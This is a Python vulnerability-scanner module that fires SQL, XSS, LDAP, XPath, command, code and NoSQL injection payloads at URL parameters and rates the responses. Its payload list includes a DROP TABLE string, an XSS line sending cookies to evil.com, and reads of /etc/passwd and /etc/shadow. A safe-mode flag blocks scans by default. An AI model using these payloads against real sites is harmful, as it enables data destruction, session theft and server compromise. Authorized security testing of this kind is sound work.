#!/usr/bin/env python3
"""
Specter Injection Testing Module
SQL injection, XSS payload generation, and vulnerability scanning
"""

import requests
import time
import random
import logging
import re
import json
import urllib.parse
from typing import Optional, List, Dict, Any, Union, Tuple, Set
from dataclasses import dataclass
from enum import Enum
from urllib.parse import urljoin, urlparse, parse_qs
import threading

logger = logging.getLogger(__name__)

class InjectionType(Enum):
    """Types of injection attacks"""
    SQL = "sql"
    XSS = "xss"
    LDAP = "ldap"
    XPATH = "xpath"
    COMMAND = "command"
    CODE = "code"
    NOSQL = "nosql"

class PayloadType(Enum):
    """Types of payloads"""
    BASIC = "basic"
    ADVANCED = "advanced"
    BLIND = "blind"
    TIME_BASED = "time_based"
    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"

class VulnerabilityLevel(Enum):
    """Vulnerability severity levels"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class InjectionPayload:
    """Injection payload"""
    payload: str
    injection_type: InjectionType
    payload_type: PayloadType
    description: str
    expected_response: Optional[str] = None
    expected_error: Optional[str] = None
    delay_seconds: float = 0.0

@dataclass
class InjectionResult:
    """Result of injection test"""
    success: bool
    injection_type: InjectionType
    payload: str
    url: str
    parameter: str
    response_code: int
    response_time: float
    vulnerability_level: VulnerabilityLevel
    evidence: str
    false_positive: bool = False

@dataclass
class VulnerabilityScanResult:
    """Result of vulnerability scan"""
    success: bool
    operation: str
    url: str
    message: str
    vulnerabilities: List[InjectionResult] = None
    error: Optional[str] = None

class SpecterInjectionTester:
    """Advanced injection testing and vulnerability scanning"""
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """Initialize injection tester
        
        Args:
            config: Configuration dictionary
        """
        self.config = config or {}
        self.safe_mode = True  # Always start in safe mode for security
        self.session = requests.Session()
        self.operation_log = []
        self.payloads = self._load_payloads()
        
        # Setup session
        self._setup_session()
    
    def _setup_session(self):
        """Setup session for testing"""
        self.session.headers.update({
            'User-Agent': 'Specter-Injection-Tester/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    def _load_payloads(self) -> Dict[InjectionType, List[InjectionPayload]]:
        """Load injection payloads"""
        payloads = {
            InjectionType.SQL: [
                InjectionPayload("'", InjectionType.SQL, PayloadType.BASIC, "Basic SQL injection - single quote"),
                InjectionPayload("''", InjectionType.SQL, PayloadType.BASIC, "Basic SQL injection - double quote"),
                InjectionPayload("' OR '1'='1", InjectionType.SQL, PayloadType.BASIC, "Basic SQL injection - OR condition"),
                InjectionPayload("' OR 1=1--", InjectionType.SQL, PayloadType.BASIC, "Basic SQL injection - OR with comment"),
                InjectionPayload("' UNION SELECT NULL--", InjectionType.SQL, PayloadType.UNION_BASED, "Union-based SQL injection"),
                InjectionPayload("'; DROP TABLE users--", InjectionType.SQL, PayloadType.ADVANCED, "Advanced SQL injection - DROP TABLE"),
                InjectionPayload("' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--", InjectionType.SQL, PayloadType.BLIND, "Blind SQL injection - table count"),
                InjectionPayload("'; WAITFOR DELAY '00:00:05'--", InjectionType.SQL, PayloadType.TIME_BASED, "Time-based SQL injection", delay_seconds=5.0),
                InjectionPayload("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", InjectionType.SQL, PayloadType.TIME_BASED, "Time-based SQL injection - SLEEP", delay_seconds=5.0),
            ],
            
            InjectionType.XSS: [
                InjectionPayload("<script>alert('XSS')</script>", InjectionType.XSS, PayloadType.BASIC, "Basic XSS - script tag"),
                InjectionPayload("<img src=x onerror=alert('XSS')>", InjectionType.XSS, PayloadType.BASIC, "Basic XSS - img onerror"),
                InjectionPayload("javascript:alert('XSS')", InjectionType.XSS, PayloadType.BASIC, "Basic XSS - javascript protocol"),
                InjectionPayload("<svg onload=alert('XSS')>", InjectionType.XSS, PayloadType.ADVANCED, "Advanced XSS - SVG onload"),
                InjectionPayload("<iframe src=javascript:alert('XSS')></iframe>", InjectionType.XSS, PayloadType.ADVANCED, "Advanced XSS - iframe"),
                InjectionPayload("'><script>alert('XSS')</script>", InjectionType.XSS, PayloadType.ADVANCED, "Advanced XSS - quote break"),
                InjectionPayload("\"><script>alert('XSS')</script>", InjectionType.XSS, PayloadType.ADVANCED, "Advanced XSS - double quote break"),
                InjectionPayload("<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>", InjectionType.XSS, PayloadType.ADVANCED, "Advanced XSS - cookie theft"),
            ],
            
            InjectionType.LDAP: [
                InjectionPayload("*", InjectionType.LDAP, PayloadType.BASIC, "Basic LDAP injection - wildcard"),
                InjectionPayload("*)(uid=*", InjectionType.LDAP, PayloadType.BASIC, "Basic LDAP injection - wildcard with condition"),
                InjectionPayload("*)(|(uid=*", InjectionType.LDAP, PayloadType.ADVANCED, "Advanced LDAP injection - OR condition"),
                InjectionPayload("*)(&(uid=*)(objectClass=*", InjectionType.LDAP, PayloadType.ADVANCED, "Advanced LDAP injection - AND condition"),
            ],
            
            InjectionType.XPATH: [
                InjectionPayload("' or '1'='1", InjectionType.XPATH, PayloadType.BASIC, "Basic XPath injection - OR condition"),
                InjectionPayload("' or 1=1 or ''='", InjectionType.XPATH, PayloadType.BASIC, "Basic XPath injection - OR with quotes"),
                InjectionPayload("' or count(//*)=1 or ''='", InjectionType.XPATH, PayloadType.BLIND, "Blind XPath injection - count"),
                InjectionPayload("' or substring(name(//*[1]),1,1)='a' or ''='", InjectionType.XPATH, PayloadType.BLIND, "Blind XPath injection - substring"),
            ],
            
            InjectionType.COMMAND: [
                InjectionPayload("; ls", InjectionType.COMMAND, PayloadType.BASIC, "Basic command injection - ls"),
                InjectionPayload("| whoami", InjectionType.COMMAND, PayloadType.BASIC, "Basic command injection - whoami"),
                InjectionPayload("&& cat /etc/passwd", InjectionType.COMMAND, PayloadType.ADVANCED, "Advanced command injection - cat passwd"),
                InjectionPayload("; cat /etc/shadow", InjectionType.COMMAND, PayloadType.ADVANCED, "Advanced command injection - cat shadow"),
                InjectionPayload("`id`", InjectionType.COMMAND, PayloadType.ADVANCED, "Advanced command injection - backticks"),
            ],
            
            InjectionType.CODE: [
                InjectionPayload("'; phpinfo(); //", InjectionType.CODE, PayloadType.BASIC, "Basic code injection - PHP info"),
                InjectionPayload("'; system('id'); //", InjectionType.CODE, PayloadType.ADVANCED, "Advanced code injection - system command"),
                InjectionPayload("'; eval($_GET['cmd']); //", InjectionType.CODE, PayloadType.ADVANCED, "Advanced code injection - eval"),
                InjectionPayload("'; file_get_contents('/etc/passwd'); //", InjectionType.CODE, PayloadType.ADVANCED, "Advanced code injection - file read"),
            ],
            
            InjectionType.NOSQL: [
                InjectionPayload("' || '1'=='1", InjectionType.NOSQL, PayloadType.BASIC, "Basic NoSQL injection - OR condition"),
                InjectionPayload("' || 1==1", InjectionType.NOSQL, PayloadType.BASIC, "Basic NoSQL injection - OR with numbers"),
                InjectionPayload("' || this.password.match(/.*/)", InjectionType.NOSQL, PayloadType.ADVANCED, "Advanced NoSQL injection - regex"),
                InjectionPayload("' || this.username.length > 0", InjectionType.NOSQL, PayloadType.BLIND, "Blind NoSQL injection - length check"),
            ]
        }
        
        return payloads
    
    def _log_operation(self, operation: str, url: str, success: bool, message: str):
        """Log injection testing operation"""
        log_entry = {
            'timestamp': time.time(),
            'operation': operation,
            'url': url,
            'success': success,
            'message': message
        }
        self.operation_log.append(log_entry)
        logger.info(f"Injection testing operation: {operation} on {url} - {message}")
    
    def _test_sql_injection(self, url: str, parameter: str, value: str, 
                           payload: InjectionPayload) -> InjectionResult:
        """Test SQL injection on a parameter
        
        Args:
            url: Target URL
            parameter: Parameter name
            value: Original parameter value
            payload: Injection payload
            
        Returns:
            InjectionResult
        """
        try:
            # Prepare test data
            test_value = value + payload.payload
            
            # Make request
            start_time = time.time()
            response = self.session.get(url, params={parameter: test_value}, timeout=30, verify=False)
            response_time = time.time() - start_time
            
            # Analyze response
            vulnerability_level = VulnerabilityLevel.LOW
            evidence = ""
            
            # Check for SQL errors
            sql_errors = [
                "mysql_fetch_array", "mysql_num_rows", "mysql_query", "mysql_error",
                "ORA-", "Microsoft OLE DB Provider", "ODBC SQL Server Driver",
                "PostgreSQL query failed", "Warning: mysql_", "MySQLSyntaxErrorException",
                "valid MySQL result", "check the manual that corresponds to your MySQL",
                "SQLServer JDBC Driver", "SQLException", "SQLiteException",
                "sqlite3.OperationalError", "sqlite3.DatabaseError"
            ]
            
            response_text = response.text.lower()
            for error in sql_errors:
                if error.lower() in response_text:
                    vulnerability_level = VulnerabilityLevel.HIGH
                    evidence = f"SQL error detected: {error}"
                    break
            
            # Check for time-based injection
            if payload.payload_type == PayloadType.TIME_BASED:
                if response_time > payload.delay_seconds:
                    vulnerability_level = VulnerabilityLevel.HIGH
                    evidence = f"Time-based injection confirmed: {response_time:.2f}s delay"
            
            # Check for union-based injection
            if payload.payload_type == PayloadType.UNION_BASED:
                if "null" in response_text or "union" in response_text:
                    vulnerability_level = VulnerabilityLevel.HIGH
                    evidence = "Union-based injection confirmed"
            
            return InjectionResult(
                success=True,
                injection_type=InjectionType.SQL,
                payload=payload.payload,
                url=url,
                parameter=parameter,
                response_code=response.status_code,
                response_time=response_time,
                vulnerability_level=vulnerability_level,
                evidence=evidence
            )
            
        except Exception as e:
            return InjectionResult(
                success=False,
                injection_type=InjectionType.SQL,
                payload=payload.payload,
                url=url,
                parameter=parameter,
                response_code=0,
                response_time=0,
                vulnerability_level=VulnerabilityLevel.LOW,
                evidence=f"Test failed: {e}"
            )
    
    def _test_xss_injection(self, url: str, parameter: str, value: str, 
                           payload: InjectionPayload) -> InjectionResult:
        """Test XSS injection on a parameter
        
        Args:
            url: Target URL
            parameter: Parameter name
            value: Original parameter value
            payload: Injection payload
            
        Returns:
            InjectionResult
        """
        try:
            # Prepare test data
            test_value = value + payload.payload
            
            # Make request
            start_time = time.time()
            response = self.session.get(url, params={parameter: test_value}, timeout=30, verify=False)
            response_time = time.time() - start_time
            
            # Analyze response
            vulnerability_level = VulnerabilityLevel.LOW
            evidence = ""
            
            # Check if payload is reflected in response
            if payload.payload in response.text:
                vulnerability_level = VulnerabilityLevel.MEDIUM
                evidence = "XSS payload reflected in response"
                
                # Check if payload is properly encoded
                encoded_payload = urllib.parse.quote(payload.payload)
                if encoded_payload not in response.text and payload.payload in response.text:
                    vulnerability_level = VulnerabilityLevel.HIGH
                    evidence = "XSS payload reflected without proper encoding"
            
            # Check for script execution indicators
            script_indicators = ["<script", "javascript:", "onerror=", "onload=", "onclick="]
            for indicator in script_indicators:
                if indicator in payload.payload.lower() and indicator in response.text.lower():
                    vulnerability_level = VulnerabilityLevel.CRITICAL
                    evidence = f"Script execution indicator found: {indicator}"
                    break
            
            return InjectionResult(
                success=True,
                injection_type=InjectionType.XSS,
                payload=payload.payload,
                url=url,
                parameter=parameter,
                response_code=response.status_code,
                response_time=response_time,
                vulnerability_level=vulnerability_level,
                evidence=evidence
            )
            
        except Exception as e:
            return InjectionResult(
                success=False,
                injection_type=InjectionType.XSS,
                payload=payload.payload,
                url=url,
                parameter=parameter,
                response_code=0,
                response_time=0,
                vulnerability_level=VulnerabilityLevel.LOW,
                evidence=f"Test failed: {e}"
            )
    
    def test_parameter(self, url: str, parameter: str, value: str, 
                      injection_types: List[InjectionType] = None) -> List[InjectionResult]:
        """Test a parameter for various injection vulnerabilities
        
        Args:
            url: Target URL
            parameter: Parameter name
            value: Original parameter value
            injection_types: Types of injection to test
            
        Returns:
            List of InjectionResult
        """
        if injection_types is None:
            injection_types = [InjectionType.SQL, InjectionType.XSS]
        
        results = []
        
        if self.safe_mode:
            logger.warning(f"Safe mode enabled - parameter testing would be performed on {url}?{parameter}={value}")
            self._log_operation("test_parameter", url, False, "Safe mode enabled - operation blocked")
            return results
        
        for injection_type in injection_types:
            if injection_type not in self.payloads:
                continue
            
            for payload in self.payloads[injection_type]:
                if injection_type == InjectionType.SQL:
                    result = self._test_sql_injection(url, parameter, value, payload)
                elif injection_type == InjectionType.XSS:
                    result = self._test_xss_injection(url, parameter, value, payload)
                else:
                    # Generic test for other injection types
                    result = self._test_generic_injection(url, parameter, value, payload)
                
                results.append(result)
                
                # Add delay between tests
                time.sleep(0.5)
        
        self._log_operation("test_parameter", url, True, f"Parameter testing completed: {len(results)} tests")
        
        return results
    
    def _test_generic_injection(self, url: str, parameter: str, value: str, 
                               payload: InjectionPayload) -> InjectionResult:
        """Test generic injection on a parameter
        
        Args:
            url: Target URL
            parameter: Parameter name
            value: Original parameter value
            payload: Injection payload
            
        Returns:
            InjectionResult
        """
        try:
            # Prepare test data
            test_value = value + payload.payload
            
            # Make request
            start_time = time.time()
            response = self.session.get(url, params={parameter: test_value}, timeout=30, verify=False)
            response_time = time.time() - start_time
            
            # Analyze response
            vulnerability_level = VulnerabilityLevel.LOW
            evidence = ""
            
            # Check for error messages
            error_patterns = {
                InjectionType.LDAP: ["ldap", "directory", "dn="],
                InjectionType.XPATH: ["xpath", "xml", "xquery"],
                InjectionType.COMMAND: ["command", "exec", "system", "shell"],
                InjectionType.CODE: ["php", "python", "ruby", "eval", "exec"],
                InjectionType.NOSQL: ["mongodb", "nosql", "mongo"]
            }
            
            response_text = response.text.lower()
            if payload.injection_type in error_patterns:
                for pattern in error_patterns[payload.injection_type]:
                    if pattern in response_text:
                        vulnerability_level = VulnerabilityLevel.MEDIUM
                        evidence = f"Error pattern detected: {pattern}"
                        break
            
            # Check for time-based injection
            if payload.payload_type == PayloadType.TIME_BASED and payload.delay_seconds > 0:
                if response_time > payload.delay_seconds:
                    vulnerability_level = VulnerabilityLevel.HIGH
                    evidence = f"Time-based injection confirmed: {response_time:.2f}s delay"
            
            return InjectionResult(
                success=True,
                injection_type=payload.injection_type,
                payload=payload.payload,
                url=url,
                parameter=parameter,
                response_code=response.status_code,
                response_time=response_time,
                vulnerability_level=vulnerability_level,
                evidence=evidence
            )
            
        except Exception as e:
            return InjectionResult(
                success=False,
                injection_type=payload.injection_type,
                payload=payload.payload,
                url=url,
                parameter=parameter,
                response_code=0,
                response_time=0,
                vulnerability_level=VulnerabilityLevel.LOW,
                evidence=f"Test failed: {e}"
            )
    
    def scan_url(self, url: str, 
                parameters: List[str] = None,
                injection_types: List[InjectionType] = None) -> VulnerabilityScanResult:
        """Scan URL for injection vulnerabilities
        
        Args:
            url: Target URL
            parameters: List of parameters to test
            injection_types: Types of injection to test
            
        Returns:
            VulnerabilityScanResult
        """
        try:
            if self.safe_mode:
                logger.warning(f"Safe mode enabled - URL scanning would be performed on {url}")
                self._log_operation("scan_url", url, False, "Safe mode enabled - operation blocked")
                return VulnerabilityScanResult(
                    success=False,
                    operation="scan_url",
                    url=url,
                    message="Safe mode enabled - operation blocked",
                    error="Safe mode"
                )
            
            vulnerabilities = []
            
            # Parse URL to extract parameters
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            if parameters is None:
                parameters = list(query_params.keys())
            
            if injection_types is None:
                injection_types = [InjectionType.SQL, InjectionType.XSS]
            
            # Test each parameter
            for param in parameters:
                if param in query_params:
                    original_value = query_params[param][0]
                    param_results = self.test_parameter(url, param, original_value, injection_types)
                    vulnerabilities.extend(param_results)
            
            # Filter out false positives
            filtered_vulnerabilities = self._filter_false_positives(vulnerabilities)
            
            self._log_operation("scan_url", url, True, f"URL scan completed: {len(filtered_vulnerabilities)} vulnerabilities found")
            
            return VulnerabilityScanResult(
                success=True,
                operation="scan_url",
                url=url,
                message=f"Scan completed: {len(filtered_vulnerabilities)} vulnerabilities found",
                vulnerabilities=filtered_vulnerabilities
            )
            
        except Exception as e:
            error_msg = f"URL scan failed: {e}"
            self._log_operation("scan_url", url, False, error_msg)
            return VulnerabilityScanResult(
                success=False,
                operation="scan_url",
                url=url,
                message=error_msg,
                error=str(e)
            )
    
    def _filter_false_positives(self, vulnerabilities: List[InjectionResult]) -> List[InjectionResult]:
        """Filter out false positive vulnerabilities
        
        Args:
            vulnerabilities: List of vulnerability results
            
        Returns:
            Filtered list of vulnerabilities
        """
        filtered = []
        
        for vuln in vulnerabilities:
            # Skip if no evidence
            if not vuln.evidence or vuln.evidence.startswith("Test failed"):
                continue
            
            # Skip if vulnerability level is too low
            if vuln.vulnerability_level == VulnerabilityLevel.LOW and "reflected" not in vuln.evidence.lower():
                continue
            
            # Additional filtering logic can be added here
            filtered.append(vuln)
        
        return filtered
    
    def generate_payload(self, injection_type: InjectionType, 
                        payload_type: PayloadType = PayloadType.BASIC,
                        custom_payload: Optional[str] = None) -> InjectionPayload:
        """Generate custom injection payload
        
        Args:
            injection_type: Type of injection
            payload_type: Type of payload
            custom_payload: Custom payload string
            
        Returns:
            InjectionPayload
        """
        if custom_payload:
            return InjectionPayload(
                payload=custom_payload,
                injection_type=injection_type,
                payload_type=payload_type,
                description=f"Custom {injection_type.value} payload"
            )
        
        # Generate payload based on type
        if injection_type == InjectionType.SQL:
            if payload_type == PayloadType.TIME_BASED:
                payload = "'; WAITFOR DELAY '00:00:05'--"
            elif payload_type == PayloadType.UNION_BASED:
                payload = "' UNION SELECT NULL--"
            else:
                payload = "' OR '1'='1"
        
        elif injection_type == InjectionType.XSS:
            if payload_type == PayloadType.ADVANCED:
                payload = "<svg onload=alert('XSS')>"
            else:
                payload = "<script>alert('XSS')</script>"
        
        else:
            payload = "test"
        
        return InjectionPayload(
            payload=payload,
            injection_type=injection_type,
            payload_type=payload_type,
            description=f"Generated {injection_type.value} payload"
        )
    
    def get_operation_log(self) -> List[Dict[str, Any]]:
        """Get operation log"""
        return self.operation_log.copy()
    
    def clear_operation_log(self):
        """Clear operation log"""
        self.operation_log.clear()

# Convenience functions
def test_sql_injection(url: str, parameter: str, value: str) -> List[InjectionResult]:
    """Test SQL injection on a parameter"""
    tester = SpecterInjectionTester()
    return tester.test_parameter(url, parameter, value, [InjectionType.SQL])

def test_xss_injection(url: str, parameter: str, value: str) -> List[InjectionResult]:
    """Test XSS injection on a parameter"""
    tester = SpecterInjectionTester()
    return tester.test_parameter(url, parameter, value, [InjectionType.XSS])

def scan_for_vulnerabilities(url: str) -> VulnerabilityScanResult:
    """Scan URL for vulnerabilities"""
    tester = SpecterInjectionTester()
    return tester.scan_url(url)

def generate_sql_payload(payload_type: PayloadType = PayloadType.BASIC) -> InjectionPayload:
    """Generate SQL injection payload"""
    tester = SpecterInjectionTester()
    return tester.generate_payload(InjectionType.SQL, payload_type)

def generate_xss_payload(payload_type: PayloadType = PayloadType.BASIC) -> InjectionPayload:
    """Generate XSS payload"""
    tester = SpecterInjectionTester()
    return tester.generate_payload(InjectionType.XSS, payload_type)

# Export main classes and functions
__all__ = [
    'SpecterInjectionTester', 'InjectionType', 'PayloadType', 'VulnerabilityLevel',
    'InjectionPayload', 'InjectionResult', 'VulnerabilityScanResult',
    'test_sql_injection', 'test_xss_injection', 'scan_for_vulnerabilities',
    'generate_sql_payload', 'generate_xss_payload'
]
